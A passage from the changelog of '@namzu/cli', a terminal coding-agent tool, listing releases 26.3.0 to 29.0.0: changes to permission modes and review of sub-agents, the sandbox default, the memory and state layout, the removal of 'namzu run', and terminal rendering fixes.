- Updated dependencies [2e2ea14]
  - @namzu/sdk@45.0.0
  - @namzu/computer-use@1.4.3
  - @namzu/anthropic@6.1.0
  - @namzu/ollama@2.2.4
  - @namzu/openai@4.1.0
  - @namzu/openrouter@3.0.1

## 29.0.0

### Major Changes

- eae8e31: **Read-only agents start without asking in `prompt` mode.** An `Agent` call that starts `explore`, or an agent file with `readOnly: true`, on the session's own provider and model no longer opens the "Start an agent" review in `prompt` or `accept-edits` mode, and `plan` mode now lets it start instead of refusing it. Every call such a child makes is still reviewed as before, and its roster still has no tool that writes.

  Still asked about: a general-purpose agent, an agent file without `readOnly: true`, a read-only agent given `provider`, `effort` or a `model` other than the session's, an agent file that names another model, and any batch that includes one of those. `strict` still refuses every launch no rule allows.

  What breaks: a `prompt`-mode operator who relied on seeing and declining each `explore` launch is no longer asked, and a `plan`-mode turn can now start read-only agents.

  To keep the old behaviour — every launch asked about in `prompt` and `accept-edits`, refused in `plan` — add an `ask` rule for the tool:

  ```json
  { "permissions": { "Agent": "ask" } }
  ```

  in `namzu.config.json` (or `permissions: { Agent: ask }` in `~/.namzu/config.yaml`). An `ask` rule is an explicit review, which the read-only exemption never skips. `/permissions details` says which rule is in force.

### Minor Changes

- 64489b3: Delegated work split into phases reads by phase, as the reference terminal's workflow view does. Nothing is removed and no key changes meaning; screens and transcripts look different.

  - **The agent rail keeps a phased workflow together.** Agents sharing a `workflow` label stay on the rail as one piece for the parent turn: a finished phase is one line, `✓ Phase 1 · 2/2 · 4.0s`, and a live phase has its agents beneath it. Unlabelled agents are grouped by launch, as before. Under 24 rows a finished phase's line is left out.
  - **The rail's header counts the whole workflow**: `● <workflow> · 1 running · 2/3 done · 6.5s · 18.0k tokens · ↓ / ctrl+t`. Time and spend show from 96 columns.
  - **The agent cockpit opens on the phase still working**, and on its first working agent, instead of on the first phase. Its header reads `2/3 agents done · 1 running · 7.7s · 18.0k tokens` while work runs and `3/3 agents · 9.5s · 27.0k tokens · done` after, in place of `N active · N total`. Phase rows add the phase's time; the agent pane is titled by its phase (`Phase 2 · 1 agent`) instead of `Agents · 1/2`.
  - **The closing line** adds the phase count when two or more were named, the tokens spent, and failures: `✻ Worked for 11s · 3 agents in 2 phases · 27.0k tokens`.

- 5fb75c2: Delegated work reads more like the reference terminal. Nothing is removed and no key changes meaning; transcripts and screenshots will look different.

  - **Launch receipts.** Each batch of agents one response launched now writes one `● Launched 2 agents · <workflow> / <phase> (ctrl+t to manage)` row, with the agents named beneath it as a `├`/`└` tree.
  - **Completion rows** read `✓ <name> · 1.7s · 9.0k tokens` or `✗ <name> · failed after 2.9s · <reason>` instead of `<name> · Completed · ctrl+t · agent details`. A completed agent's final answer is attached collapsed; Ctrl+O opens it. The hint is `ctrl+o result · ctrl+t details`.
  - **A closing line**, `✻ Worked for 38s · 3 agents`, ends a turn that launched agents. Other turns add nothing.
  - **The rail is a borderless tree** under the footer: a `● <workflow> · N running · N queued · ↓ / ctrl+t` header, one `├`/`└` branch per agent, and the running agent's activity on a `⎿` line beneath it on terminals at least 24 rows tall. Tool uses and spend now come before the model. It shows up to three agents on a 30-row terminal where it showed four, because each agent takes two rows there.
  - **The rail stays visible while an approval dialog is open**, reduced to its header line. It used to disappear for as long as the dialog was up.
  - **One waiting line.** When the parent is only waiting on its agents, the `Waiting · <name>` rows fold into `✻ Waiting for N agents to finish`.
  - **The `/effort` picker is a left-to-right slider** on terminals at least 60 columns wide: `default`, the model's levels, then `┆ orchestrate` in violet with `<highest> + delegate by default` under it. ←/→ (and ↑/↓) move it, digits select, Enter applies, Esc goes back. Narrower terminals, and menus too long for one row, keep the vertical list.
  - **Orchestrate mode shows on the message box**: the top border carries `orchestrate` in violet on the right, with a still colour gradient where colour is allowed; the footer's `orchestrate` is violet. Below 40 columns the border stays plain.

- 4375e72: The terminal draws research turns the way the reference terminal does.

  - **Web searches and fetches** are one row naming the query or address, `✓ Web search("…")` / `✓ Web fetch(https://…)`, with a `⎿` line that reads `Searching: …` while the call runs and settles to `Found 3 results in 4.1s`, `Did 1 search in 9.0s` or `Received 7.5KB in 1.2s`. Consecutive calls sit together without blank lines, and a long query is cut at the terminal's width with an ellipsis. A fetched page or result list stays behind Ctrl+O. They used to read `✓ Web search · 9.0s` with no query and a blank line between every row.
  - **Markdown tables** are drawn as a box (`┌┬┐ ├┼┤ └┴┘`) sized to the terminal, with long cells wrapped inside their column and `**bold**`, `` `code` `` and links drawn rather than shown as source. Where the columns cannot fit, the table becomes `Header: value` records separated by a `─` rule. A table streaming in no longer flashes raw `| a | b |` rows. Tables used to be a header, one rule and cells cut mid-word at 32 characters.
  - **The Working row** counts the turn's output, `Working (46s · ↓ 1.1k tokens · esc to interrupt)`.
  - **A finished turn** that took three seconds or more closes with `✻ Worked for 46s`, as a turn that delegated work already did.
  - **Wrapped text** in replies, your own messages and notices no longer starts a row with the space it wrapped at, so every row of a paragraph starts in the same column.

  Nothing to change on your side.

### Patch Changes

- 710e684: A wide row in the agent cockpit no longer runs one cell past its pane: the model or token count at the end of the row sat on the frame's padding and touched the border.
- 4f14e2d: On a terminal under 64 columns the agent rail's header now counts agents done out of the total (`2/3 done`), the figure its wide form and the agent cockpit's header give at the same moment. It used to print the agents still running over the total with no word after it (`1/3`), which read as one agent done. Nothing to change on your side.
- 45a79f3: Three places in the delegated-work screens named a key or text that did not work or was cut off:

  - An agent's `ctrl+o result` row that had scrolled into history could not be opened. Now, once the live bodies are open, the next Ctrl+O opens the newest settled body in the output viewer, and ←/→ move to the others. With nothing settled, the second press still just folds the live bodies.
  - While an approval dialog is open, the reduced agents rail no longer shows `↓ / ctrl+t`. The dialog holds both keys, so neither reached the rail.
  - On an 80-column terminal the effort slider's `<highest> + delegate by default` sub-label moves left so it fits on screen instead of being cut. The spend warning wraps instead of being cut. The rows it uses stay reserved on the other stops, so the picker keeps the same height when the caret moves.

  No configuration or API changes.

- d9b1d30: An `Agent` call that names the session's own `model`, with no `provider` or `effort`, now runs on the session's provider, as a call with no `model` does. It used to be looked up in the model catalogue, and when the session provider's listing failed or did not list that id, the child ran on any other connected provider that did — including a read-only `explore` launch, which starts without the "Start an agent" review on the promise that it stays on the session's provider. To send a child to another provider, name `provider` (still reviewed).

  The agent cockpit's phase pane is titled `Phases`. It used to read `Phases · 1/2`, the cursor position, above phase rows whose `2/2` means agents done, so a finished two-phase workflow read as one phase of two. Nothing to change on your side.

- 5bacecf: A transcript row written while the reply above it is still streaming no longer reaches scrollback before that reply. It used to settle first on a short terminal; when the reply then finished it was placed below rows already printed, so one row was printed twice and the reply's sentence was never printed. Nothing to do on upgrade.
- f934968: A transcript row keeps its column and its wrap when it settles into scrollback. Settled rows used to lose the one column of padding live rows have, so a finished screen mixed rows starting at column 0 and column 1, and a long settled row wrapped two columns wider than it had while live. The brand header, printed the same way, moves one column right with them. Nothing to do on upgrade.
- 0a39453: A reply that is still streaming is drawn where it stands in the conversation. It used to be drawn below every finished row, so a row written while it streamed, such as the launch receipt of an agent running in the foreground, appeared above the text that came before it and the two swapped when the turn ended. Rows no longer move after they are drawn. Nothing to do on upgrade.
- a31aeb7: A reply taller than the terminal keeps its last line once it finishes. The redrawn part of the screen is now held one row shorter than the terminal, so the renderer no longer clears the screen and replays the session on every frame of a long reply, and no longer erases the reply's final line when the turn settles. While such a reply streams, its newest rows stay on screen; the whole reply reaches scrollback when it ends.

  A list item or blockquote containing a pipe directly under a markdown table is drawn as a list item or quote again, not as an extra table row.

- e3c9228: Typing that reaches the composer in one long read (keystrokes queued behind a busy screen, with no bracketed-paste markers) is now inserted as typed text. It used to become a `Pasted text` chip once it passed 80 characters, and the chip was joined back to what had been typed before it with a blank line — so the message the model received could have a word split in two ("subag" / "ents"). A bracketed paste over 80 characters, and any unbracketed chunk containing a newline, is still held as a chip. Nothing to do on upgrade.
- Updated dependencies [4375e72]
- Updated dependencies [1b65e2e]
  - @namzu/sdk@44.3.0
  - @namzu/openai@4.1.0
  - @namzu/anthropic@6.1.0
  - @namzu/google@1.1.0

## 28.1.1

### Patch Changes

- 9bd0c99: Plan mode now holds inside delegated work.

  `@namzu/sdk`: new optional `BaseAgentConfig.reviewAllowedCalls` and `AgentTaskContext.reviewAllowedCalls`. `AgentManager` stamps the spawning context's function onto every child (after the `configBuilder` runs) and onto the child's spawn context, so grandchildren inherit it too; `SupervisorAgent` hands its own to its workers, and `ReactiveAgent` and `SupervisorAgent` pass it to `query()`. Before, only the turn a host called `query()` with saw `QueryParams.reviewAllowedCalls`: inside a child, a batch a rule allowed, or one an approval earlier in the child's turn covered, ran without reaching the borrowed review handler. Nothing changes for a host that never sets the field. A child config that sets its own value keeps it, but it is OR-ed with the inherited one: a child can ask for more review and can no longer answer `false` over a parent that answers `true`. A host that builds its own `AgentTaskContext` for a `TaskScheduler` should set the field from the function it passes its own `query()`.

  `@namzu/cli`: plan mode entered with Shift+Tab while a sub-agent runs now refuses that sub-agent's next change even when a `permissions` rule allows it; before, the child ran it. `/resume` on a parked turn now continues it under the permission mode the operator is in, read at each decision like a new turn's, for the turn and its sub-agents; before, the interactive terminal resumed it under `auto` whatever the mode, so `/resume` in plan mode let its changes through and a Shift+Tab during it did nothing. With nobody asked on a resumed turn, `prompt` and `accept-edits` still approve what the rules leave to review; `plan` and `strict` now refuse. `namzu exec` resumes under the mode it was started with, as before, and in plan mode that now also covers changes a rule allows.

- Updated dependencies [9bd0c99]
  - @namzu/sdk@44.2.0

## 28.1.0

### Minor Changes

- fad53e3: Shift+Tab now changes the permission mode while a turn runs, and its only reply is the footer. It used to be refused mid-turn with "Permissions were not changed. Finish or stop the current work first." (once per press), and every accepted press appended "Permissions: <mode> for this session. …" to the transcript. Now the running turn's next approval decision, the delegated turns that borrow its review, and every later turn are decided under the new mode; an approval dialog already on screen keeps the mode it was asked under, entering plan mode refuses the next call that would change something, and leaving it approves nothing already refused. Each change is recorded as `approval_policy_changed` in the session log before it takes effect, and the model is told once. `/permissions` still answers in the transcript. The footer's hold mark is `‖` instead of `⏸`, an emoji code point that Windows Terminal draws as a blue two-cell tile; the same mark replaces it on the interrupted-turn notice and the paused-queue line.
- f2ec6e7: The model's plan is drawn once, as a checklist in the transcript. Consecutive task calls fold into one block with a header in words (`Added 2 tasks`, `Started · <subject>`, `Completed · <subject>`, `Tasks · 1/2 done`) and the checklist as it stood afterwards; `/tasks` draws the same checklist. No task id, owner, JSON argument or model receipt (`Task created: <uuid> — "…" [owner: namzu]`, `1 tasks: 0 completed, …`) is shown any more. The marks are one-cell text characters with exactly one space before the subject — `□` pending, `■` in progress (bold), `✓` completed (dimmed, struck through), `✗` failed — instead of `☐`/`☑`/`☒`/`◐`, which emoji-capable fonts drew as two-cell colour pictures. The eight-row task list above the composer is gone; a single row naming the current step appears there only while the checklist is out of view. A system notice identical to the row directly before it is no longer printed a second time.

### Patch Changes

- 51af1b3: Plan mode now refuses a change that a permission rule allows. Before, a batch whose every call a rule allowed (for example `permissions: { bash: 'allow' }`) ran without reaching the review handler, so a turn in plan mode, whether it started there or the operator entered it with Shift+Tab mid-turn, still ran `touch` or any other allowed command, while the model had been told that every change is refused. The CLI now asks the kernel to send such batches to review while it is in plan mode; nothing changes in any other mode.

  For SDK hosts: `QueryParams.reviewAllowedCalls?: () => boolean` is new and optional. Read once per batch; `true` sends a batch a rule allows, or a grant from earlier in the turn covers, to `resumeHandler` instead of running it, each call carrying the gate's decision in `authorization`. A rule's `deny` still refuses. Absent, behaviour is unchanged.

- 406e7a2: A task removed with `task_update` status `deleted` is now distinguishable on the stream: its `task_updated` event carries `deleted: true` (the SSE `task.updated` event too), with the subject and status the task had when it went. Before, a removal arrived as an update that changed nothing, so the interactive terminal kept drawing the removed task as an open step in the checklist. It now drops the task and writes `Removed task · <subject>`. The field is optional and absent on every other update; a consumer that ignores it sees the same events as before.
- Updated dependencies [51af1b3]
- Updated dependencies [406e7a2]
- Updated dependencies [0d23de8]
  - @namzu/sdk@44.1.0

## 28.0.0

### Major Changes

- a75f5c2: **`namzu run` and `namzu run-stream` are removed. Use `namzu exec`.**

  | Before                        | After                                             |
  | ----------------------------- | ------------------------------------------------- |
  | `namzu run "<prompt>"`        | `namzu exec "<prompt>"` (or `namzu e "<prompt>"`) |
  | `namzu run-stream "<prompt>"` | `namzu exec --json "<prompt>"`                    |

  `exec` takes every option the two old commands took, with the same meanings:
  `--cwd`, `--provider`, `--model`, `--effort`, `--skills`, `--continue`/`-c`,
  `--resume`, `--session`, `--gate`, `--gate-retries`, `--max-iterations`,
  `--token-budget`, `--wait-for-provider`, `--permission-mode`, `--trust`,
  `--yolo` and `--`. The default mode prints the reply exactly as `run` did and
  keeps its exit codes (0, 1, 2, 64, 75, 77, and death by SIGTERM/SIGHUP/SIGINT).
  `--json` writes the same NDJSON events, with the same kinds and fields, and
  the same exit codes (0, 1, 75, 77) that `run-stream` did. Typing `run` or
  `run-stream` now fails with commander's `unknown command` error, exit 64, and
  a line naming the replacement. Update scripts, CI jobs and host UIs that spawn
  either command.

  **New: `--output-schema <file>` on `exec`.** It binds the final answer to a
  JSON Schema through the provider's native structured output, in either mode.
  Before, `--output-schema` was accepted only before the command, for the TUI,
  and refused everywhere else; given before `exec` it is still refused, now with
  a message that says to pass it after `exec`. A schema file that cannot be read
  or represented exits 64 (in `--json` mode: an `error` event and exit 0).

  **Also changed:**

  - `namzu exec --session <id>` without `--json` is refused with exit 64. `run`
    accepted `--session` and ignored it, answering against no history; the
    default mode resumes with `--continue` or `--resume <id>`.
  - `namzu resident` refuses `--json` and `--output-schema`, which it would
    otherwise have accepted and ignored.
  - The `--log-format` help and the TUI's `--output-schema` help name `exec`.

### Minor Changes

- ab9108b: Refresh the Zen and Zen Go model catalogue in the background on every launch. The interactive TUI, `resume`, `run`, `run-stream`, `acp`, `drain`, `resident run` and the background resident runner start one refresh that never delays startup, gives up after 30 seconds and is cancelled when the command ends. When it lands, the model picker and routing use it immediately, including for providers already built, and it is saved as a last-good copy at `cli/zen-catalogue.json` under `NAMZU_HOME`. When it fails, the session keeps the last-good copy, or otherwise the bundled catalogue, and logs one warning. A damaged copy on disk is ignored rather than read in part. A model the service serves with no known wire format is not offered in the picker, since the CLI has no setting that names a protocol for it.

  This is on by default, and each of those launches now reads OpenCode's documentation pages, models.dev and the two Zen `/models` endpoints over the network. To keep the previous behaviour (bundled catalogue only, no network read), set `modelCatalogueRefresh: false` in `~/.namzu/config.yaml`, or `NAMZU_MODEL_CATALOGUE_REFRESH=0`.

### Patch Changes

- 128913f: The TUI says "turn" where it still said "run" for the unit of work that no
  longer exists: `/cost`, `/status` and the status panel label spend as
  "current or latest turn", a message held after a paused turn says so, the
  `/config` notice names turn limits, and the headless trust refusal says a
  headless turn approves tools without asking, and `namzu doctor`'s
  remediation for an unusable fallback says turns will still start. Wording only; nothing a script
  parses changed.
- Updated dependencies [ab9108b]
  - @namzu/zen@2.5.0

## 27.0.0

### Major Changes

- 518b0d3: Every turn the CLI starts keeps its newest 10 checkpoints instead of all of
  them. That covers interactive turns, `namzu run`, resumed and drained turns,
  and delegated child sessions. A turn takes a checkpoint every iteration plus
  one per tool review, and nothing set a limit, so a long session kept every
  one. On one machine that came to 19,014 checkpoint files and 6.33 GB.

  **What changes for you.** Only the newest 10 checkpoint documents of each turn
  stay in `<session-id>/checkpoints/`, and `namzu drain` reports at most that
  many per turn. A checkpoint whose decision is still outstanding is never
  pruned. Resuming is unaffected, because every resume reads the checkpoint it
  was handed or the newest one. If you inspect intermediate checkpoints by hand,
  copy them out while the turn is still going.

- b064cea: **The OS sandbox is now off by default.** Shell commands and file tools run
  on the host under the permission system, the way other coding agents run
  them: each shell command goes through your permission rules and mode, and a
  file tool's path outside the working directory and the added directories is
  shown to you as an approval request (`Outside the working directory: <path>`)
  instead of being refused. It is asked every time — `auto`, `--yolo`, `plan`
  (for a read) and an earlier "allow all tools for this session" included —
  while `strict` and a `deny` rule still refuse it. **A headless turn refuses it**: pass the
  directory with `--add-dir` (or `additionalDirectories`) when an unattended run
  needs it. Each answer is an audit record.

  **To keep the previous behaviour** (every command confined), write
  `sandbox.enabled: true` in `namzu.config.json` or `~/.namzu/config.yaml`. The
  sandbox is also on, without that line, when `sandbox.requireIsolation` names a
  control or `sandbox.workspace` is `ephemeral`. `sandbox.enabled: false` keeps
  working as before.

  With the sandbox on, a `bash` call may set `dangerously_disable_sandbox: true`
  to run one command on the host. It is asked about every time, `auto` and
  `--yolo` included (`plan` and `strict` refuse it); it is refused when nobody can
  be asked, unless `sandbox.allowUnattendedEscape: true`; `sandbox.allowEscape:
false` refuses it always. Each approval or refusal is an audit record.

  `/add-dir` of a directory outside the working directory now asks before adding
  it, deciding after links are followed (a link inside that points outside is
  asked about under the path it leads to, and that canonical path is what is
  added). A directory inside the working directory is no longer added: the tools
  already reach it. The system prompt states where tools run and how to reach past that, and
  on WSL where the Windows drives are and how to start a Windows program.

- 7cac6dc: `#note` and `/memory add` now save a typed memory file instead of appending a bullet to `<project>/.namzu/MEMORY.md`.

  What changes for you:

  - **Where a note goes.** `#note <text>` and `/memory add <text>` write `<name>.md` (type `project`; `/memory add --type user|feedback|project|reference <text>` picks another) into the project's stored memory — `<NAMZU_HOME>/projects/<slug>/memory/` by default — the same files the model's `save_memory`, `search_memory` and `read_memory` use. The terminal names the file. `/memory --user add <text>` is unchanged and still appends to `~/.namzu/MEMORY.md`. To keep writing a note into the curated project file, edit `<project>/.namzu/MEMORY.md` directly; it is still read into every turn.
  - **Old notes are copied only when you ask, and your file is never changed.** The project's curated `MEMORY.md` is not rewritten, at launch or ever: nothing can tell a bullet `#note` appended from one you wrote. When it holds top-level bullets, the launch says how many, once per curated file, and `/memory import-notes` copies every top-level bullet (its first line) into a typed `project` memory, skipping any already stored — by an earlier import, a `#note` with the same text, or a copy you archived — so running it twice creates no duplicates. The bullets stay curated text in every turn until you delete them from the file yourself.
  - **A one-time move of the JSON store on first launch.** An earlier JSON memory store (`index.json` + `content/`) in the same directory is imported with its ids and renamed `*.migrated`; the launch says so. A record too large for a memory file (over 256 KiB) is not imported and is named, with the retired file that still holds it.
  - **The prompt.** Every turn carries a `## Stored memories (index)` section — one line per memory you or the model saved, at most 200, your `feedback` and `user` memories first. What the session memory promoter (or `compaction.consolidate`) writes after a turn is searchable but not listed, so a turn's record does not change the next turn's system prompt — and the curated sections are renamed `## Curated memory (all projects)` and `## Curated memory (this project)` (they were `## Durable memory` and `## Project memory`). Anything that matched those headings in a captured prompt must match the new ones.
  - **`/memory show`** lists stored memories' index lines before the curated files, and what turns recorded on their own in a separate `Recorded by turns (N)` section, so those records are visible even though the prompt's index leaves them out.
  - **Note names are short.** A note's file is named after its first words, at most 32 characters, so its index line keeps room for the note itself.

  Nothing in the CLI's library exports changed.

- 3e7a97b: The CLI moves to the SDK's session → turn → message model and to one state
  layout under `NAMZU_HOME` (default `~/.namzu`). Conversations, checkpoints,
  memory and resident state written by 26.x are **not read** by this version.

  **Before you upgrade.**

  - **Run `namzu drain` on 26.x** until it reports nothing parked. A turn still
    parked on a decision or a provider wait when you upgrade cannot be resumed.
  - **Export any conversation you want to keep** with
    `namzu history --session <id> > conversation.json` on 26.x (with no
    `--session`, the latest one in the folder); it prints the messages as JSON.
    There is no migration: nothing is imported, so nothing is lost silently or
    brought back half-read.

  ## What changes for you

  - **Where state lives.** Each working directory gets
    `~/.namzu/projects/<slug>/`, where the slug is the directory's canonical
    path with every character outside `[A-Za-z0-9]` replaced by `-`. A session is
    `<session-id>.jsonl` there, with its child sessions, checkpoints, tasks,
    feedback, goals, tool-result spills and file-history snapshots under
    `<session-id>/`. Memory moves to `projects/<slug>/memory/`, resident state to
    `projects/<slug>/residents/`, and git worktrees to
    `projects/<slug>/worktrees/`. `~/.namzu/index.sqlite` is an index rebuilt
    from the logs whenever it is missing or out of date; deleting it loses
    nothing. The CLI still never writes into the working directory; `.namzu/`
    there is read only, for the agents, skills, commands, plugins and
    `MEMORY.md` you put in it.
  - **Old state is left alone and reported.** `namzu state` now prints report
    `version: 2` with a `legacy` category: the old top-level `state/`,
    `sessions/`, `titles.json`, `desktop-sessions.json`, `delegation-history/`,
    `checkpoints/`, `tenants/`, `goals/`, `feedback/`, `learning/`,
    `residents/`, `worktrees/` and `memory/`, and every `projects/<uuid>/`
    directory. It lists their paths and sizes and never opens, moves or deletes
    them; remove them yourself once you have exported what you need. A new
    `projects/<slug>/` is never reported as legacy.
  - **One turn at a time per session.** A session has at most one active turn.
    `namzu run` and `namzu run-stream` against a session whose turn is still
    running, paused or interrupted now exit **75** (EX_TEMPFAIL) and name that
    turn: on stderr for `run`, as an NDJSON
    `{"kind":"error","code":"turn_in_progress",…}` event for `run-stream`. 75
    keeps its existing meaning for a provider pause too; a wrapper that already
    retries later on 75 needs no change. In the TUI the refusal offers
    `/resume` or the new **`/abandon`**, which closes the paused turn so the next
    prompt can start.
  - **A rate limit on the first request pauses the turn.** A provider rate
    limit or outage on a turn's first request used to fail it (`namzu run`
    exit 1) with nothing to continue; it now pauses it at a checkpoint like the
    same fault later in the turn: `namzu run` exits 75 naming the checkpoint,
    `--wait-for-provider` waits and resumes it, and `/resume` or `namzu drain`
    continues it.
  - **`/agents runs` is now `/agents batches`**, with no alias. `/agents runs`
    prints the unknown-subcommand usage.
  - **NDJSON gains ids.** `run-stream`'s `done` and `usage` events carry
    `sessionId` and `turnId`, and a `paused` event names its `turnId` instead
    of a run id.
  - **Hooks.** The events `run_start`, `run_end` and `run_interrupt` are
    `turn_start`, `turn_end` and `turn_interrupt`; a config that names an old
    event is refused at load with a message naming the new one. A hook's stdin
    carries `turn_id` (not `run_id`) and, on `subagent_stop`,
    `parent_session_id` and `parent_turn_id` (not `parent_run_id`); its
    environment carries `NAMZU_TURN_ID` (not `NAMZU_RUN_ID`). `session_id` and
    `NAMZU_SESSION_ID` are always set. `session_start` and `session_end` hooks
    receive no turn id: the CLI no longer invents one for them.
  - **`namzu drain`** keeps its flag names and exit codes (0, 1, 64, 77), but
    `--store` means something else: it was the `runs/` directory a checkpoint
    store wrote to, and it is now the namzu home (`NAMZU_HOME`, `~/.namzu` by
    default) whose `projects/` hold the session logs. A `--store` without a
    `projects/` directory is refused with 64, so a wrapper that still passes its
    old `runs/` path must pass the home instead. A scope the store does not hold
    (an unknown session, one under another project or tenant, a child session)
    is also 64; state that cannot be read is 1. It finds parked turns through
    the session index, takes each session's lease, and continues the same turn
    from its checkpoint; a turn whose session lease another worker holds is
    skipped and reported.
  - **Delegation history is not carried over.** The history block and
    `/agents` read finished child sessions from their logs; children recorded by
    26.x do not appear.
  - **Checkpoints.** A session keeps each turn's newest 10 checkpoints under
    `<session-id>/checkpoints/`; one an open decision references is never
    pruned. `/restore` snapshots are under `<session-id>/file-history/`.
  - **Crash dumps are gone.** The session log and per-iteration checkpoints hold
    everything an interrupted turn needs, so no `emergency/` dumps are written.
    An interactive session that was interrupted closes that turn as interrupted
    when you send the next prompt.
  - **A stopped process gives its conversation back.** On SIGTERM, SIGHUP (a
    closed terminal) or SIGINT, the TUI, `namzu run` and `namzu run-stream`
    release the conversation's writer lease first, then stop the turn, close
    the session (tool servers, background jobs, the `session_end` hook) and give
    the terminal back, and then die of the signal they were sent: a wrapper
    sees 143, 129 or 130 as before. The turn is left interrupted, so `/abandon`,
    `/resume`, `namzu drain` or the TUI's next prompt take it at once; before,
    they were refused as "leased by a live writer" for up to five minutes. A
    second signal exits immediately. `run-stream` writes
    `{"kind":"error","code":"terminated",…}` and a final `done` before it exits,
    and `run` names the session on stderr. SIGKILL still leaves the lease to
    expire. The message follows where the signal found the turn: a turn that
    had already ended (the session still closing) is reported as recorded, not
    interrupted, and `run-stream`'s one `done` is then the turn's own; a
    `run --wait-for-provider` stopped during its wait says the turn is paused
    at its checkpoint, and does not resume it.

### Patch Changes

- 96ac3ec: A session never writes generated state into its working directory, and a
  session started in the home directory no longer reads the same memory file
  twice.

  Every entry point — `namzu`, `namzu run`, `namzu run-stream`, `namzu drain`
  and resident runs — keeps its sessions, memory and task state under the
  application home (`NAMZU_HOME`, else `~/.namzu`), in the working directory's
  `projects/<slug>/`, and files them under that directory's one Project.
  `<cwd>/.namzu` is only read, for the agents, skills, commands, plugins and
  `MEMORY.md` you keep there.

  Started in `$HOME` with no `NAMZU_HOME`, the project's `.namzu/MEMORY.md` and
  the user's `~/.namzu/MEMORY.md` are one file. It was injected into every
  prompt twice, under both headings. It is now read once, as the user memory.

- 3641102: The turn-start repository snapshot (`git status` and recent commits, sent on a
  send's first request) now reaches the model as request-only context after the
  conversation, not as a system message. On Anthropic, each new send used to
  change the system prompt and re-read the whole conversation uncached. Now the
  cached conversation is kept and only the snapshot's own tokens are new.

  What the model reads changes in two ways: the snapshot arrives in a user-role
  message rather than a system message, and it follows the line
  `Current step context (runtime-generated; not a new user request):`, which
  every request-only context message opens with. The snapshot text itself is
  unchanged.

- Updated dependencies [8805360]
- Updated dependencies [a729b17]
- Updated dependencies [9355755]
- Updated dependencies [755a81a]
- Updated dependencies [cb1f00c]
- Updated dependencies [3641102]
- Updated dependencies [933ba6d]
- Updated dependencies [3e7a97b]
- Updated dependencies [a84dc1c]
- Updated dependencies [b064cea]
- Updated dependencies [9238347]
- Updated dependencies [a14b013]
- Updated dependencies [3641102]
- Updated dependencies [3641102]
- Updated dependencies [3e43fc2]
  - @namzu/sdk@44.0.0
  - @namzu/anthropic@6.0.1
  - @namzu/openrouter@3.0.1
  - @namzu/zen@2.4.0
  - @namzu/computer-use@1.4.3
  - @namzu/ollama@2.2.4
  - @namzu/openai@4.0.0

## 26.3.0

### Minor Changes

- 5d902f2: The provider picker draws one row per vendor, and offers each way to
  authenticate that vendor inside the row.

  The duplicate was real and it was reported from a screen like this one: a
  machine with the subscription signed in drew `OpenAI (Codex subscription)` as a
  detected row and, below it under `Not detected — enter a credential to use
these:`, the same vendor again asking for `OPENAI_API_KEY`. The registry models
  a subscription sign-in and an API key as two provider ids, and the list was a
  list of ids — so one product read as two, and the operator holding the key had
  to work out which of the two rows was theirs.

  A row is now a vendor. It says what this machine has (`Codex session · this
device`) or what is missing (`needs OPENAI_API_KEY`), and entering it offers its
  ways in — the detected subscription first, then the API key, then a sign-in
  where nothing works yet. Each choice leads where that way in already led: a
  detected session opens the vendor's models, a credential opens the paste field,
  a sign-in starts the operation `l` starts. No second credential mechanism was
  built: a typed key still travels the same `setKeyEntry` → `acceptKey` →
  session-credential path, and nothing about credential resolution at run time
  changed. No config key was added.

  **What moves.** Five shapes a reader may have matched change on this screen.
  The detected block keeps discovery's order, but a vendor that was two rows is
  one, so rows below it renumber. A detected row is titled by its vendor rather
  than by its registry entry, which changes exactly one row in this registry —
  the subscription row now reads `OpenAI` with its session in the source column,
  where it used to read `OpenAI (Codex subscription)`. Where a row's ways in name
  more than one provider, Enter opens a choice screen instead of acting
  immediately; in this registry that is one row, the vendor whose two ids are a
  subscription and a key, and its detected session is the first item and the
  initial cursor. Every other row keeps the keystroke it always had — an
  unconfigured row opens its paste field, a detected row opens its models — so
  the daily path is unchanged. One row that had only one way in now has two: a
  vendor with neither a session nor a key offers the key first and the sign-in
  second, where before it went straight to the paste field. And the list is
  shorter: nine vendors is the most it can draw, so the digit shortcut's nine-row
  limit is now a bound this screen cannot pass, and the sentence about the rows
  past nine no longer appears.

  That last one is why this is `minor` rather than `patch` — the same reason the
  previous picker change gave. No exported symbol, CLI flag, config key, default
  or wire shape moved; `ProviderRegistryEntry` gained a required `vendor` field
  and a vendor table, which is the CLI's own integration layer rather than a
  published surface. A screen whose rows a script or a reader may have matched is
  a screen whose changes are visible to them, and a renumbered list is the most
  visible kind.

  **What did not merge.** Zen and Zen Go are one company's two services, not two
  credentials for one product: separate catalogues, separate billing routes and
  keys that do not open each other, so a single row would put a product decision
  under a heading about authentication, and the word `Go` is the only thing
  telling an operator they are choosing between two priced things. Ollama and LM
  Studio are two different local servers. AWS Bedrock and `http` remain absent
  from the list entirely, for the reasons recorded beside them.

  **The sub-menu asks about ways, not about ids.** It was gated on a row's ways
  coming from more than one registry id, which answered the wrong question in both
  directions. `anthropic` is ONE id that takes a signed-in session and an API key,
  so a machine with the Claude session found had two real choices — keep using
  that session, or enter a key of one's own — and was asked nothing; two ids that
  happened to be the same key would have been asked twice. The gate is the number
  of ways in, and the key is offered beside what discovery found whenever what was
  found is not itself a key (asked with `signedInSubscriptionProviders`, the
  predicate the sign-in screen already decides that by, so an OAuth token in an
  environment variable counts as the session it is on both screens). A vendor
  whose free catalogue works without a credential gets the same treatment: the
  free models are one way in and the key is another. Everything else is unchanged
  — what follows each answer, the wording and the ordering — and a row with one
  way in keeps the keystroke it always had, so an exported key, a local server or
  an unconfigured vendor still goes straight to its models or its paste field with
  nothing in between.

  **Four more things, found by running it on a real terminal at 60x20 and 50x20** —
  sizes no rendering test used, which is why the tests were green. The text area
  was computed as `columns - 4` and the app's own one-column inset on each side
  was not counted, so a row was measured two columns wider than it was drawn and
  the note beside the model just marked `(current)` wrapped onto a line of its
  own; the width is derived from all three terms now. A row wider than the box is
  squeezed by the renderer and loses the trailing space of the text nodes it is
  built from, which is how the cursor row came out as `›6. DeepSeek` — the row's
  segments are children of one text node now, and its source column is wrapped by
  the screen so it stays inside the box. The box was as tall as its rows wanted,
  so on a 20-row terminal Ink scrolled it and the notice explaining the screen —
  the first thing an operator needs — was above the top of it; the height is
  counted from the lines the screen will draw, and the list is windowed to fit
  with the window following the cursor. And `(free)` printed twice on 22 of the
  25 zero-priced rows of the catalogue this was measured against, whose own names
  end in `(free)`: the marker stays, the repetition goes, and the rule reads the
  word rather than one vendor's punctuation. Two smaller ones: the sentences the
  box is sized against are wrapped by the screen, so a continuation no longer
